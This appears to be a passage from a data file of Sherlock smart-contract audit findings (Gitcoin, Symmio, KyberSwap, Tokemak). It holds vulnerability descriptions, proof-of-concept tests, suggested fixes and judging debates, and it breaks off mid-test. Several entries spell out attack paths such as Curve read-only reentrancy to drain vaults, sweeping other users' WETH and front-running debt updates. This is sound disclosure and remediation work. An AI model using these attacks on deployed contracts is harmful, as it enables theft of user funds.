Accept two times after three rejections\n        Statuses[0] = IStrategy.Status.Accepted;\n        vm.startPrank(pool_admin());\n        qvStrategy().reviewRecipients(recipientIds, Statuses);\n\n        vm.startPrank(pool_manager4());\n        qvStrategy().reviewRecipients(recipientIds, Statuses);\n\n        // 3 Rejected, 2 Accepted, but status is Accepted because it overwrites right after passing threshold.\n        assertEq(uint8(qvStrategy().getRecipientStatus(recipientId)), uint8(IStrategy.Status.Accepted));\n        assertEq(qvStrategy().reviewsByStatus(recipientId, IStrategy.Status.Rejected), 3);\n        assertEq(qvStrategy().reviewsByStatus(recipientId, IStrategy.Status.Accepted), 2);\n    }\n```\n\nYou can find the test results below:ч"Checking the review counts before updating the state might be helpful to mitigate this issue\nDiscussion\n0xKurt\n@nfrgosselin How to deal with this depends of how the pool admin wants to approve or reject applications:\nCount each status --> 4 accepted and 2 rejected with threshold at 8 this would be approved\nWhatever the last status set is --> the last manager to set the status\nOnce the status is set it cannot be changed\nThese are a couple example we thought of. WDYT?\nsherlock-admin2\nEscalate\n#589 and #699 are essentially describing the same root cause. All relevant dupes associated with this two issues should be combined, as both are describing the possibility of pool manager reviewing a recipient multiple times leading to overwritten recipient status.\n```\nYou've deleted an escalation for this issue.\n```\n\nosmanozdemir1\nEscalate\n#589 and #699 are essentially describing the same root cause. All relevant dupes associated with this two issues should be combined, as both are describing the possibility of pool manager reviewing a recipient multiple times leading to overwritten recipient status.\nThis issue doesn't describe same manager reviewing a recipient multiple times. As you can see in the coded PoC above, every review is made by different managers. This issue is far different than the #589 and describes recipient can be changed even with less review counts.\nnevillehuang\nI still stand that both are duplicates. Both are describing the same root cause of not checking the previous status and not respecting review threshold, allowing overwriting of recipient status\nBenRai1\nI would side with @osmanozdemir1 on that. The issues https://github.com/sherlock-audit/2023-09-Gitcoin-judging/issues/589 and https://github.com/sherlock-audit/2023-09-Gitcoin-judging/issues/699 are different since they describe two different issues where the fix is different.\nThe first issue would be fixed by tracking what manager already voted for what recipient. This would not fix the issue where the last manager who reviews a recipient can turn the result even if more managers voted for an other result. Just becasue both issues are in the same function this does not mean that they are the same\nnevillehuang\nI would side with @osmanozdemir1 on that. The issues #589 and #699 are different since they describe two different issues where the fix is different.\nThe first issue would be fixed by tracking what manager already voted for what recipient. This would not fix the issue where the last manager who reviews a recipient can turn the result even if more managers voted for an other result. Just becasue both issues are in the same function this does not mean that they are the same\nOn second thought, you are right, the issues are not duplicates. One is talking about pool managers potentially casting many votes influencing recipient status by bypassing `reviewThreshold`, while the other is pool managers casting votes as expected but doesn't respect the majority outcome. Removing escalation\n0xf1b0\nIn my report #315, I mentioned both cases described in #589 and this one. If it's not a duplicate I should be added to the #699 ""found by"" list.\nnevillehuang\nEscalate\nOn third thought, report #315 mentions both issues, and again convinces me that #589 and #699 are stemming from the same root cause of ineffective reviewThresholds. Both issues stems from overriding recipient status, regardless it being the same pool manager or multiple different pool manager. #315 should be made a primary issue and all other issues should be dupped under it.\nsherlock-admin2\nEscalate\nOn third thought, report #315 mentions both issues, and again convinces me that #589 and #699 are stemming from the same root cause of ineffective reviewThresholds. Both issues stems from overriding recipient status, regardless it being the same pool manager or multiple different pool manager. #315 should be made a primary issue and all other issues should be dupped under it.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nosmanozdemir1\nEscalate\nOn third thought, report #315 mentions both issues, and again convinces me that #589 and #699 are stemming from the same root cause of ineffective reviewThresholds. Both issues stems from overriding recipient status, regardless it being the same pool manager or multiple different pool manager. #315 should be made a primary issue and all other issues should be dupped under it.\nI disagree with this comment and disagree with both of these issues being duplicates. The solution of the first issue is tracking which manager reviewed which recipient with a mapping. This solution is implemented in this fix. The fix of the first issue does not solve the second issue. The solution of the second issue can be implemented in different ways depending on the developer team's intentions. Which is mentioned here, and the fix is implemented here. As you can see the fixes of these two issues are quite different.\nJust because one submission (#315) mentioning two different issues together doesn't mean those two issues are the same, and doesn't mean all of them should be duped together. It only means that the submitter preferred to submit them together to strengthen his/her submission. As you can see in the Sherlock documentation, best practices number 3: ""Do not submit multiple issues in a single submission. Even if the 2 completely different issues occur on the same line, please make sure to separately submit them""\nI'm not sure if the Sherlock allows labelling one submission with two different duplicate labels in these kind of situations. #315 might be duped under both of these two primary issues or it can be duped under the one with less duplicates according to the Sherlock rules and the judge's decision.\n0xf1b0\nBy the way, my report #315 also includes a mention of and a proposed fix for #729 issue. Since it's my first time participating in a contest and I don't have the capability to escalate, I'll leave it here with the hope that it will be taken into consideration.\n0xf1b0\nI will certainly need to reconsider the issue submission process.\nHowever, it's important to note that ""best practices"" should not be interpreted as rigid rules. The documentation does not explicitly state that deviating from these practices will result in no rewards or that only a single issue will be acknowledged.\nMoreover, the question of whether these issues are truly separate remains a subject of debate.\nneeksec\nI suggest to keep the orignal judging.\nBoth are describing the same root cause of not checking the previous status and not respecting review threshold\nThis one is not checking the previous status and #589 is not respecting review threshold. Although these two bugs both alow to manipulate review status, the root cause is different. The fixes are also different which was well described by https://github.com/sherlock-audit/2023-09-Gitcoin-judging/issues/699#issuecomment-1763517995.\njacksanford1\nhttps://github.com/allo-protocol/allo-v2/pull/349\nEvert0x\nPlanning to reject escalation and keep issue state.\nRoot cause is different in the mentioned issues.\nEvert0x\nResult: Medium Has Duplicates\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nnevillehuang: rejected\njack-the-pug\nNot Fixed.\nManagers who haven't voted yet can still change a recipient's status by voting for another status."чRecipient status might be overwritten with less review counts.\nCode Snippet\nTool used\nManual Review
CREATE3 is not available in the zkSync Era.чmediumч"```\naddress ⇒ keccak256( \n    keccak256(""zksyncCreate2"") ⇒ 0x2020dba91b30cc0006188af794c2fb30dd8520db7e2c088b7fc7c103c00ca494, \n    sender, \n    salt, \n    keccak256(bytecode), \n    keccak256(constructorInput)\n ) \n```\n"ч"According to the contest README, the project can be deployed in zkSync Era. (https://github.com/sherlock-audit/2023-09-Gitcoin/blob/main/README.md?plain=1#L11)\nThe zkSync Era docs explain how it differs from Ethereum.\nThe description of CREATE and CREATE2 (https://era.zksync.io/docs/reference/architecture/differences-with-ethereum.html#create-create2) states that Create cannot be used for arbitrary code unknown to the compiler.\nPOC:\nYou can check sample POC code at zkSync Era Testnet(https://goerli.explorer.zksync.io/address/0x0f670f8AfcB09f4BC509Cb59D6e7CEC1A52BFA51#contract)\nAlso, the logic to compute the address of Create2 is different from Ethereum, as shown below, so the CREATE3 library cannot be used as it is.\nThis cause registry returns an incorrect `preCalculatedAddress`, causing the anchor to be registered to an address that is not the actual deployed address.\n```\naddress ⇒ keccak256( \n    keccak256(""zksyncCreate2"") ⇒ 0x2020dba91b30cc0006188af794c2fb30dd8520db7e2c088b7fc7c103c00ca494, \n    sender, \n    salt, \n    keccak256(bytecode), \n    keccak256(constructorInput)\n ) \n```\n"ч
UUPSUpgradeable vulnerability in OpenZeppelin Contractsчmediumч"```\nFile: ks-elastic-sc/package.json\n\n    ""@openzeppelin/contracts"": ""4.3.1"",\n    ""@openzeppelin/test-helpers"": ""0.5.6"",\n    ""@openzeppelin/contracts-upgradeable"": ""4.3.1"",\n```\n"ч"Openzeppelin has found the critical severity bug in UUPSUpgradeable. The kyber-swap contracts has used both openzeppelin contracts as well as openzeppelin upgrabable contracts with version v4.3.1. This is confirmed from package.json.\n```\nFile: ks-elastic-sc/package.json\n\n    ""@openzeppelin/contracts"": ""4.3.1"",\n    ""@openzeppelin/test-helpers"": ""0.5.6"",\n    ""@openzeppelin/contracts-upgradeable"": ""4.3.1"",\n```\n\nThe `UUPSUpgradeable` vulnerability has been found in openzeppelin version as follows,\n@openzeppelin/contracts : Affected versions >= 4.1.0 < 4.3.2 @openzeppelin/contracts-upgradeable : >= 4.1.0 < 4.3.2\nHowever, openzeppelin has fixed this issue in versions 4.3.2\nOpenzeppelin bug acceptance and fix: check here\nThe following contracts has been affected due to this vulnerability\nBoth of these contracts are UUPSUpgradeable and the issue must be fixed."ч
Position value can fall below minimum acceptable quote value when partially closing positions requested to be closed in fullчmediumч"```\nif (LibQuote.quoteOpenAmount(quote) != quote.quantityToClose) {\n    require(quote.lockedValues.total() >= symbolLayout.symbols[quote.symbolId].minAcceptableQuoteValue,\n        ""LibQuote: Remaining quote value is low"");\n}\n```\n"ч"In `LibQuote.closeQuote` there is a requirement to have the remaining quote value to not be less than minAcceptableQuoteValue:\n```\nif (LibQuote.quoteOpenAmount(quote) != quote.quantityToClose) {\n    require(quote.lockedValues.total() >= symbolLayout.symbols[quote.symbolId].minAcceptableQuoteValue,\n        ""LibQuote: Remaining quote value is low"");\n}\n```\n\nNotice the condition when this require happens:\n`LibQuote.quoteOpenAmount(quote)` is remaining open amount\n`quote.quantityToClose` is requested amount to close\nThis means that this check is ignored if partyA has requested to close amount equal to full remaining quote value, but enforced when it's not (even if closing fully). For example, a quote with opened amount = 100 is requested to be closed in full (amount = 100): this check is ignored. But PartyB can fill the request partially, for example fill 99 out of 100, and the remainder (1) is not checked to confirm to `minAcceptableQuoteValue`.\nThe following execution paths are possible if PartyA has open position size = 100 and `minAcceptableQuoteValue` = 5:\n`requestToClosePosition(99)` -> revert\n`requestToClosePosition(100)` -> `fillCloseRequest(99)` -> pass (remaining quote = 1)"ч"The condition should be to ignore the `minAcceptableQuoteValue` if request is filled in full (filledAmount == quantityToClose):\n```\n-       if (LibQuote.quoteOpenAmount(quote) != quote.quantityToClose) {\n+       if (filledAmount != quote.quantityToClose) {\n            require(quote.lockedValues.total() >= symbolLayout.symbols[quote.symbolId].minAcceptableQuoteValue,\n                ""LibQuote: Remaining quote value is low"");\n        }\n```\n\nDiscussion\nMoonKnightDev\nFixed Code PR: https://github.com/SYMM-IO/symmio-core/pull/31"ч"There can be multiple reasons why the protocol enforces `minAcceptableQuoteValue`, one of them might be the efficiency of the liquidation mechanism: when quote value is too small (and liquidation value too small too), liquidators will not have enough incentive to liquidate these positions in case they become insolvent. Both partyA and partyB might also not have enough incentive to close or respond to request to close such small positions, possibly resulting in a loss of funds and greater market risk for either user.\nProof of Concept\nAdd this to any test, for example to `ClosePosition.behavior.ts`.\n```\nit(""Close position with remainder below minAcceptableQuoteValue"", async function () {\n  const context: RunContext = this.context;\n\n  this.user_allocated = decimal(1000);\n  this.hedger_allocated = decimal(1000);\n\n  this.user = new User(this.context, this.context.signers.user);\n  await this.user.setup();\n  await this.user.setBalances(this.user_allocated, this.user_allocated, this.user_allocated);\n\n  this.hedger = new Hedger(this.context, this.context.signers.hedger);\n  await this.hedger.setup();\n  await this.hedger.setBalances(this.hedger_allocated, this.hedger_allocated);\n\n  await this.user.sendQuote(limitQuoteRequestBuilder()\n    .quantity(decimal(100))\n    .price(decimal(1))\n    .cva(decimal(10)).lf(decimal(5)).mm(decimal(15))\n    .build()\n  );\n  await this.hedger.lockQuote(1, 0, decimal(5, 17));\n  await this.hedger.openPosition(1, limitOpenRequestBuilder().filledAmount(decimal(100)).openPrice(decimal(1)).price(decimal(1)).build());\n\n  // now try to close full position (100)\n  await this.user.requestToClosePosition(\n    1,\n    limitCloseRequestBuilder().quantityToClose(decimal(100)).closePrice(decimal(1)).build(),\n  );\n\n  // now partyA cancels request\n  //await this.user.requestToCancelCloseRequest(1);\n\n  // partyB can fill 99\n  await this.hedger.fillCloseRequest(\n    1,\n    limitFillCloseRequestBuilder()\n      .filledAmount(decimal(99))\n      .closedPrice(decimal(1))\n      .build(),\n  );\n\n  var q = await context.viewFacet.getQuote(1);\n  console.log(""quote quantity: "" + q.quantity.div(decimal(1)) + "" closed: "" + q.closedAmount.div(decimal(1)));\n\n});\n```\n\nConsole execution result:\n```\nquote quantity: 100 closed: 99\n```\n\nCode Snippet\nTool used\nManual Review"
MultiAccount `depositAndAllocateForAccount` function doesn't scale the allocated amount correctly, failing to allocate enough fundsчmediumч```\n    AccountFacetImpl.deposit(msg.sender, amount);\n    uint256 amountWith18Decimals = (amount * 1e18) /\n        (10 ** IERC20Metadata(GlobalAppStorage.layout().collateral).decimals());\n    AccountFacetImpl.allocate(amountWith18Decimals);\n```\nч"Internal accounting (allocatedBalances) are tracked as fixed numbers with 18 decimals, while collateral tokens can have different amount of decimals. This is correctly accounted for in AccountFacet.depositAndAllocate:\n```\n    AccountFacetImpl.deposit(msg.sender, amount);\n    uint256 amountWith18Decimals = (amount * 1e18) /\n        (10 ** IERC20Metadata(GlobalAppStorage.layout().collateral).decimals());\n    AccountFacetImpl.allocate(amountWith18Decimals);\n```\n\nBut it is treated incorrectly in MultiAccount.depositAndAllocateForAccount:\n```\n    ISymmio(symmioAddress).depositFor(account, amount);\n    bytes memory _callData = abi.encodeWithSignature(\n        ""allocate(uint256)"",\n        amount\n    );\n    innerCall(account, _callData);\n```\n\nThis leads to incorrect allocated amounts."ч"Scale amount correctly before allocating it:\n```\n    ISymmio(symmioAddress).depositFor(account, amount);\n+   uint256 amountWith18Decimals = (amount * 1e18) /\n+       (10 ** IERC20Metadata(collateral).decimals());\n    bytes memory _callData = abi.encodeWithSignature(\n        ""allocate(uint256)"",\n-       amount\n+       amountWith18Decimals\n    );\n    innerCall(account, _callData);\n```\n\nDiscussion\nsherlock-admin\n1 comment(s) were left on this issue during the judging contest.\n0xyPhilic commented:\ninvalid because internally the depositAndAllocateForAccount calls the allocate function which does not use scaled amount but the actual input amount\nMoonKnightDev\nNo funds will be lost. The user simply needs to reallocate their balance. Therefore, the severity is not high since there's no loss of funds.\nnevillehuang\nRelating to this comment in the previous contest, it has the same root cause and potential same consequence, so could be valid H.\nMoonKnightDev\nRelating to this comment in the previous contest, it has the same root cause and potential same consequence, so could be valid H.\nThe root cause differs. Here, you can easily rectify the allocatedBalance by allocating again. Moreover, no funds are lost\nnevillehuang\nRelating to this comment in the previous contest, it has the same root cause and potential same consequence, so could be valid H.\nThe root cause differs. Here, you can easily rectify the allocatedBalance by allocating again. Moreover, no funds are lost\nOk can be valid M according to Impact mentioned in the submission.\nMoonKnightDev\nFixed Code PR: https://github.com/SYMM-IO/symmio-core/pull/35"чSimilar to 222 from previous audit contest, the user expects to have full amount deposited and allocated, but ends up with only dust amount allocated, which can lead to unexpected liquidations (for example, user is at the edge of liquidation, calls depositAndAllocate to improve account health, but is liquidated instead). For consistency reasons, since this is almost identical to 222, it should also be high.\nCode Snippet\nTool used\nManual Review
Price returned by Oracle is not verifiedчmediumч```\nfunction getTellorCurrentValue(bytes32 _queryId)\n ..SNIP..\n    // retrieve most recent 20+ minute old value for a queryId. the time buffer allows time for a bad value to be disputed\n    (, bytes memory data, uint256 timestamp) = tellor.getDataBefore(_queryId, block.timestamp - 20 minutes);\n    uint256 _value = abi.decode(data, (uint256));\n    if (timestamp == 0 || _value == 0) return (false, _value, timestamp);\n```\nчAs per the example provided by Tellor on how to integrate the Tellor oracle into the system, it has shown the need to check that the price returned by the oracle is not zero.\n```\nfunction getTellorCurrentValue(bytes32 _queryId)\n ..SNIP..\n    // retrieve most recent 20+ minute old value for a queryId. the time buffer allows time for a bad value to be disputed\n    (, bytes memory data, uint256 timestamp) = tellor.getDataBefore(_queryId, block.timestamp - 20 minutes);\n    uint256 _value = abi.decode(data, (uint256));\n    if (timestamp == 0 || _value == 0) return (false, _value, timestamp);\n```\n\nThus, the value returned from the `getDataBefore` function should be verified to ensure that the price returned by the oracle is not zero. However, this was not implemented.ч"
ETH deposited by the user may be stolen.чhighч```\n    /// @inheritdoc ILMPVaultRouterBase\n    function deposit(\n        ILMPVault vault,\n        address to,\n        uint256 amount,\n        uint256 minSharesOut\n    ) public payable virtual override returns (uint256 sharesOut) {\n        // handle possible eth\n        _processEthIn(vault);\n\n        IERC20 vaultAsset = IERC20(vault.asset());\n        pullToken(vaultAsset, amount, address(this));\n\n        return _deposit(vault, to, amount, minSharesOut);\n    }\n```\nчIn the `deposit` function, if the user pays with ETH, it will first call `_processEthIn` to wrap it and then call `pullToken` to transfer.\n```\n    /// @inheritdoc ILMPVaultRouterBase\n    function deposit(\n        ILMPVault vault,\n        address to,\n        uint256 amount,\n        uint256 minSharesOut\n    ) public payable virtual override returns (uint256 sharesOut) {\n        // handle possible eth\n        _processEthIn(vault);\n\n        IERC20 vaultAsset = IERC20(vault.asset());\n        pullToken(vaultAsset, amount, address(this));\n\n        return _deposit(vault, to, amount, minSharesOut);\n    }\n```\n\n`_processEthIn` will wrap ETH into WETH, and these WETH belong to the contract itself.\n```\n    function _processEthIn(ILMPVault vault) internal {\n        // if any eth sent, wrap it first\n        if (msg.value > 0) {\n            // if asset is not weth, revert\n            if (address(vault.asset()) != address(weth9)) {\n                revert InvalidAsset();\n            }\n\n            // wrap eth\n            weth9.deposit{ value: msg.value }();\n        }\n    }\n```\n\nHowever, `pullToken` transfers from `msg.sender` and does not use the WETH obtained in `_processEthIn`.\n```\n    function pullToken(IERC20 token, uint256 amount, address recipient) public payable {\n        token.safeTransferFrom(msg.sender, recipient, amount);\n    }\n```\n\nIf the user deposits 10 ETH and approves 10 WETH to the contract, when the deposit amount is 10, all of the user's 20 WETH will be transferred into the contract.\nHowever, due to the `amount` being 10, only 10 WETH will be deposited into the vault, and the remaining 10 WETH can be stolen by the attacker using `sweepToken`.\n```\n    function sweepToken(IERC20 token, uint256 amountMinimum, address recipient) public payable {\n        uint256 balanceToken = token.balanceOf(address(this));\n        if (balanceToken < amountMinimum) revert InsufficientToken();\n\n        if (balanceToken > 0) {\n            token.safeTransfer(recipient, balanceToken);\n        }\n    }\n```\n\nBoth `mint` and `deposit` in `LMPVaultRouterBase` have this problem.чPerform operations based on the size of `msg.value` and amount:\nmsg.value == amount: transfer WETH from contract not `msg.sender`\nmsg.value > amount: transfer WETH from contract not `msg.sender` and refund to `msg.sender`\nmsg.value < amount: transfer WETH from contract and transfer remaining from `msg.sender`чETH deposited by the user may be stolen.\nCode Snippet\nTool used\nManual Review
Destination Vault rewards are not added to idleIncrease when info.totalAssetsPulled > info.totalAssetsToPullчhighч```\n                uint256 assetPreBal = _baseAsset.balanceOf(address(this));\n                uint256 assetPulled = destVault.withdrawBaseAsset(sharesToBurn, address(this));\n\n                // Destination Vault rewards will be transferred to us as part of burning out shares\n                // Back into what that amount is and make sure it gets into idle\n                info.idleIncrease += _baseAsset.balanceOf(address(this)) - assetPreBal - assetPulled;\n                info.totalAssetsPulled += assetPulled;\n                info.debtDecrease += totalDebtBurn;\n\n                // It's possible we'll get back more assets than we anticipate from a swap\n                // so if we do, throw it in idle and stop processing. You don't get more than we've calculated\n                if (info.totalAssetsPulled > info.totalAssetsToPull) {\n                    info.idleIncrease = info.totalAssetsPulled - info.totalAssetsToPull;\n                    info.totalAssetsPulled = info.totalAssetsToPull;\n                    break;\n                }\n```\nчIn the `_withdraw` function, Destination Vault rewards will be first recorded in `info.IdleIncrease` by `info.idleIncrease += _baseAsset.balanceOf(address(this)) - assetPreBal - assetPulled;`.\nBut when `info.totalAssetsPulled > info.totalAssetsToPull`, `info.idleIncrease` is directly assigned as `info.totalAssetsPulled` - info.totalAssetsToPull, and `info.totalAssetsPulled` is `assetPulled` without considering Destination Vault rewards.\n```\n                uint256 assetPreBal = _baseAsset.balanceOf(address(this));\n                uint256 assetPulled = destVault.withdrawBaseAsset(sharesToBurn, address(this));\n\n                // Destination Vault rewards will be transferred to us as part of burning out shares\n                // Back into what that amount is and make sure it gets into idle\n                info.idleIncrease += _baseAsset.balanceOf(address(this)) - assetPreBal - assetPulled;\n                info.totalAssetsPulled += assetPulled;\n                info.debtDecrease += totalDebtBurn;\n\n                // It's possible we'll get back more assets than we anticipate from a swap\n                // so if we do, throw it in idle and stop processing. You don't get more than we've calculated\n                if (info.totalAssetsPulled > info.totalAssetsToPull) {\n                    info.idleIncrease = info.totalAssetsPulled - info.totalAssetsToPull;\n                    info.totalAssetsPulled = info.totalAssetsToPull;\n                    break;\n                }\n```\n\nFor example,\n```\n                    // preBal == 100 pulled == 10 reward == 5 toPull == 6\n                    // idleIncrease = 115 - 100 - 10 == 5\n                    // totalPulled(0) += assetPulled == 10 > toPull\n                    // idleIncrease = totalPulled - toPull == 4 < reward\n```\n\nThe final `info.idleIncrease` does not record the reward, and these assets are not ultimately recorded by the Vault.ч`info.idleIncrease = info.totalAssetsPulled - info.totalAssetsToPull;` -> `info.idleIncrease += info.totalAssetsPulled - info.totalAssetsToPull;`чThe final `info.idleIncrease` does not record the reward, and these assets are not ultimately recorded by the Vault.\nMeanwhile, due to the `recover` function's inability to extract the `baseAsset`, this will result in no operations being able to handle these Destination Vault rewards, ultimately causing these assets to be frozen within the contract.\nCode Snippet\nTool used\nManual Review
When `queueNewRewards` is called, caller could transfer tokens more than it should beчhighч```\n    function queueNewRewards(uint256 newRewards) external onlyWhitelisted {\n        uint256 startingQueuedRewards = queuedRewards;\n        uint256 startingNewRewards = newRewards;\n\n        newRewards += startingQueuedRewards;\n\n        if (block.number >= periodInBlockFinish) {\n            notifyRewardAmount(newRewards);\n            queuedRewards = 0;\n        } else {\n            uint256 elapsedBlock = block.number - (periodInBlockFinish - durationInBlock);\n            uint256 currentAtNow = rewardRate * elapsedBlock;\n            uint256 queuedRatio = currentAtNow * 1000 / newRewards;\n\n            if (queuedRatio < newRewardRatio) {\n                notifyRewardAmount(newRewards);\n                queuedRewards = 0;\n            } else {\n                queuedRewards = newRewards;\n            }\n        }\n\n        emit QueuedRewardsUpdated(startingQueuedRewards, startingNewRewards, queuedRewards);\n\n        // Transfer the new rewards from the caller to this contract.\n        IERC20(rewardToken).safeTransferFrom(msg.sender, address(this), newRewards);\n    }\n```\nчInside `queueNewRewards`, irrespective of whether we're near the start or the end of a reward period, if the accrued rewards are too large relative to the new rewards (queuedRatio is greater than newRewardRatio), the new rewards will be added to the queue (queuedRewards) rather than being immediately distributed.\n```\n    function queueNewRewards(uint256 newRewards) external onlyWhitelisted {\n        uint256 startingQueuedRewards = queuedRewards;\n        uint256 startingNewRewards = newRewards;\n\n        newRewards += startingQueuedRewards;\n\n        if (block.number >= periodInBlockFinish) {\n            notifyRewardAmount(newRewards);\n            queuedRewards = 0;\n        } else {\n            uint256 elapsedBlock = block.number - (periodInBlockFinish - durationInBlock);\n            uint256 currentAtNow = rewardRate * elapsedBlock;\n            uint256 queuedRatio = currentAtNow * 1000 / newRewards;\n\n            if (queuedRatio < newRewardRatio) {\n                notifyRewardAmount(newRewards);\n                queuedRewards = 0;\n            } else {\n                queuedRewards = newRewards;\n            }\n        }\n\n        emit QueuedRewardsUpdated(startingQueuedRewards, startingNewRewards, queuedRewards);\n\n        // Transfer the new rewards from the caller to this contract.\n        IERC20(rewardToken).safeTransferFrom(msg.sender, address(this), newRewards);\n    }\n```\n\nHowever, when this function tried to pull funds from sender via `safeTransferFrom`, it used `newRewards` amount, which already added by `startingQueuedRewards`. If previously `queuedRewards` already have value, the processed amount will be wrong.чUpdate the transfer to use `startingNewRewards` instead of `newRewards` :\n```\n    function queueNewRewards(uint256 newRewards) external onlyWhitelisted {\n        uint256 startingQueuedRewards = queuedRewards;\n        uint256 startingNewRewards = newRewards;\n\n        newRewards // Add the line below\n= startingQueuedRewards;\n\n        if (block.number >= periodInBlockFinish) {\n            notifyRewardAmount(newRewards);\n            queuedRewards = 0;\n        } else {\n            uint256 elapsedBlock = block.number // Remove the line below\n (periodInBlockFinish // Remove the line below\n durationInBlock);\n            uint256 currentAtNow = rewardRate * elapsedBlock;\n            uint256 queuedRatio = currentAtNow * 1000 / newRewards;\n\n            if (queuedRatio < newRewardRatio) {\n                notifyRewardAmount(newRewards);\n                queuedRewards = 0;\n            } else {\n                queuedRewards = newRewards;\n            }\n        }\n\n        emit QueuedRewardsUpdated(startingQueuedRewards, startingNewRewards, queuedRewards);\n\n        // Transfer the new rewards from the caller to this contract.\n// Remove the line below\n        IERC20(rewardToken).safeTransferFrom(msg.sender, address(this), newRewards);\n// Add the line below\n        IERC20(rewardToken).safeTransferFrom(msg.sender, address(this), startingNewRewards);\n    }\n```\nчThere are two possible issue here :\nIf previously `queuedRewards` is not 0, and the caller don't have enough funds or approval, the call will revert due to this logic error.\nIf previously `queuedRewards` is not 0, and the caller have enough funds and approval, the caller funds will be pulled more than it should (reward param + `queuedRewards` )\nCode Snippet\nTool used\nManual Review
Curve V2 Vaults can be drained because CurveV2CryptoEthOracle can be reentered with WETH tokensчhighч```\naddress public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;\n\n// rest of code\n\n// Only need ability to check for read-only reentrancy for pools containing native Eth.\nif (checkReentrancy) {\n    if (tokens[0] != ETH && tokens[1] != ETH) revert MustHaveEthForReentrancy();\n}\n```\nч`CurveV2CryptoEthOracle.registerPool` takes `checkReentrancy` parameters and this should be True only for pools that have `0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE` tokens and this is validated here.\n```\naddress public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;\n\n// rest of code\n\n// Only need ability to check for read-only reentrancy for pools containing native Eth.\nif (checkReentrancy) {\n    if (tokens[0] != ETH && tokens[1] != ETH) revert MustHaveEthForReentrancy();\n}\n```\n\nThis Oracle is meant for Curve V2 pools and the ones I've seen so far use WETH address instead of `0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE` (like Curve V1) and this applies to all pools listed by Tokemak.\nFor illustration, I'll use the same pool used to test proper registration. The test is for `CRV_ETH_CURVE_V2_POOL` but this applies to other V2 pools including rETH/ETH. The pool address for `CRV_ETH_CURVE_V2_POOL` is 0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511 while token address is 0xEd4064f376cB8d68F770FB1Ff088a3d0F3FF5c4d.\nIf you interact with the pool, the coins are: 0 - WETH - 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 1 - CRV - 0xD533a949740bb3306d119CC777fa900bA034cd52\nSo how can WETH be reentered?! Because Curve can accept ETH for WETH pools.\nA look at the pool again shows that Curve uses python kwargs and it includes a variable `use_eth` for `exchange`, `add_liquidity`, `remove_liquidity` and `remove_liquidity_one_coin`.\n```\ndef exchange(i: uint256, j: uint256, dx: uint256, min_dy: uint256, use_eth: bool = False) -> uint256:\ndef add_liquidity(amounts: uint256[N_COINS], min_mint_amount: uint256, use_eth: bool = False) -> uint256:\ndef remove_liquidity(_amount: uint256, min_amounts: uint256[N_COINS], use_eth: bool = False):\ndef remove_liquidity_one_coin(token_amount: uint256, i: uint256, min_amount: uint256, use_eth: bool = False) -> uint256:\n```\n\nWhen `use_eth` is `true`, it would take `msg.value` instead of transfer WETH from user. And it would make a raw call instead of transfer WETH to user.\nIf raw call is sent to user, then they could reenter LMP vault and attack the protocol and it would be successful cause CurveV2CryptoEthOracle would not check for reentrancy in getPriceInEth\n```\n// Checking for read only reentrancy scenario.\nif (poolInfo.checkReentrancy == 1) {\n    // This will fail in a reentrancy situation.\n    cryptoPool.claim_admin_fees();\n}\n```\n\nA profitable attack that could be used to drain the vault involves\nDeposit shares at fair price\nRemove liquidity on Curve and updateDebtReporting in LMPVault with view only reentrancy\nWithdraw shares at unfair priceчIf CurveV2CryptoEthOracle is meant for CurveV2 pools with WETH (and no 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE), then change the ETH address to weth. As far as I can tell Curve V2 uses WETH address for ETH but this needs to be verified.\n```\n-   if (tokens[0] != ETH && tokens[1] != ETH) revert MustHaveEthForReentrancy();\n+   if (tokens[0] != WETH && tokens[1] != WETH) revert MustHaveEthForReentrancy();\n```\nчThe protocol could be attacked with price manipulation using Curve read only reentrancy. The consequence would be fatal because `getPriceInEth` is used for evaluating debtValue and this evaluation decides shares and debt that would be burned in a withdrawal. Therefore, an inflated value allows attacker to withdraw too many asset for their shares. This could be abused to drain assets on LMPVault.\nThe attack is cheap, easy and could be bundled in as a flashloan attack. And it puts the whole protocol at risk cause a large portion of their deposit would be on Curve V2 pools with WETH token.\nCode Snippet\nTool used\nManual Review
updateDebtReporting can be front run, putting all the loss on later withdrawals but taking the profitчhighч"```\nfunction test_AvoidTheLoss() public {\n\n// for simplicity sake, i'll be assuming vault keeps nothing idle\n\n// as it does not affect the attack vector in any ways\n\n_accessController.grantRole(Roles.SOLVER_ROLE, address(this));\n\n_accessController.grantRole(Roles.LMP_FEE_SETTER_ROLE, address(this));\n\naddress feeSink = vm.addr(555);\n\n_lmpVault.setFeeSink(feeSink);\n\n_lmpVault.setPerformanceFeeBps(2000); // 20%\n\naddress alice = address(789);\n\nuint initialBalanceAlice = 1000;\n\n// User is going to deposit 1000 asset\n\n_asset.mint(address(this), 1000);\n\n_asset.approve(address(_lmpVault), 1000);\n\nuint shareBalUser = _lmpVault.deposit(1000, address(this));\n\n_underlyerOne.mint(address(this),500);\n\n_underlyerOne.approve(address(_lmpVault),500);\n\n_lmpVault.rebalance(\n\naddress(_destVaultOne),\n\naddress(_underlyerOne),\n\n500,\n\naddress(0),\n\naddress(_asset),\n\n1000\n\n);\n\n_asset.mint(alice,initialBalanceAlice);\n\nvm.startPrank(alice);\n\n_asset.approve(address(_lmpVault),initialBalanceAlice);\n\nuint shareBalAlice = _lmpVault.deposit(initialBalanceAlice,alice);\n\nvm.stopPrank();\n\n// rebalance to 2nd vault\n\n_underlyerTwo.mint(address(this), 1000);\n\n_underlyerTwo.approve(address(_lmpVault),1000);\n\n_lmpVault.rebalance(\n\naddress(_destVaultTwo),\n\naddress(_underlyerTwo),\n\n1000,\n\naddress(0),\n\naddress(_asset),\n\n1000\n\n);\n\n// the second destVault incurs loss, 10%\n\n_mockRootPrice(address(_underlyerTwo), 0.9 ether);\n\n  \n\n// the first vault incurs some profit, 5%\n\n// so lmpVault is in netLoss of 